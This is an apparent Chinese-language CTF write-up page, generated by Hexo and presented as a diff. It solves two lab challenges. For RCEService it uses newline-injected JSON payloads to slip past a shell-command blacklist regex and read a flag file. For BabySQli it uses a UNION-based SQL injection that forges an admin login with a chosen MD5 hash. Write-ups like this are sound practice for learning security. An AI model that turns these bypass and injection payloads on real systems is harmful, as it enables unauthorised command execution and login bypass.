@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>做题笔记-2 - EZzz</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[FBCTF2019]RCEService1.打开网页看到Enter command as JSON，意思是输入命令作为 JSON
+2.源码
+1234567891011121314151617181,"> 
+    
+    <link rel="alternative" href="atom.xml" title="EZzz" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="做题笔记-2 - EZzz"/>
+    <meta name="twitter:description" content="[FBCTF2019]RCEService1.打开网页看到Enter command as JSON，意思是输入命令作为 JSON
+2.源码
+1234567891011121314151617181,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="EZzz"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="做题笔记-2 - EZzz"/>
+    <meta property="og:description" content="[FBCTF2019]RCEService1.打开网页看到Enter command as JSON，意思是输入命令作为 JSON
+2.源码
+1234567891011121314151617181,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">EZzz</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">做题笔记-2</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">做题笔记-2</h1>
+        <div class="stuff">
+            <span>一月 11, 2023</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>1.打开网页看到<code>Enter command as JSON</code>，意思是<code>输入命令作为 JSON</code></p>
+<p>2.源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用的传参是cmd，看到有一个<code>preg_match</code>进行匹配，看wp可以用<code>%0a</code>进行绕过，因为<code>preg_match()函数</code>只能匹配第一行数据，而<code>%0a</code>是换行符，但因为会匹配<code>\x00-\x1FA</code>，所以会匹配一个<code>%0a</code>，可以多写一个来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">if ($cmd !== NULL) &#123;</span><br><span class="line">  system($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;Invalid input&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>需要给json中的cmd进行赋值，然后就会执行<code>system($cmd);</code></p>
+<p>3.使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;ls /&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>因为需要使用cat命令，但源码中有<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，意思是环境变量引用的是<code>/home/rceservice/jail</code>里面的，由于文件太多不知道flag在哪里，需要使用find命令，而find命令在<code>/usr/bin/</code>里面所以payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">中有一条/home/rceservice/flag</span><br></pre></td></tr></table></figure>
+
+<p>所以可以知道flag文件的路径，然后就是使用cat命令来返回内容，但cat命令在bin目录下，所以payload是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;%0a%0a</span><br></pre></td></tr></table></figure>
+
+<p>可以得到flag</p>
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>打开网页源代码，有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过base32和base64解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>2，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin&#x27;union select 1,2,database()#&amp;pw=1</span><br></pre></td></tr></table></figure>
+
+<p>发现database()被过滤</p>
+<p>3.看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	function stripslashes_deep($value)</span><br><span class="line">	&#123;</span><br><span class="line">		$value = is_array($value) ?</span><br><span class="line">		array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">		stripslashes($value);</span><br><span class="line">		return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">	$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">	$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">	$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;wrong pass!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			die(&quot;wrong user!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先得让$arr[1]等于admin，还得让md5后的$password等于$arr[2]</p>
+<p>4.当使用<code>select * from user where username =&#39;1&#39; union select 1,2,3#</code>的时候，当没有&#96;username &#x3D;’1’时，返回select 1,2,3</p>
+<p>所以可以给name传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,3#</span><br></pre></td></tr></table></figure>
+
+<p>符合第一个条件</p>
+<p>再给name传123  md5编码后的202cb962ac59075b964b07152d234b70</p>
+<p>然后给password传123</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;#&amp;pw=123</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">1.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">2.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
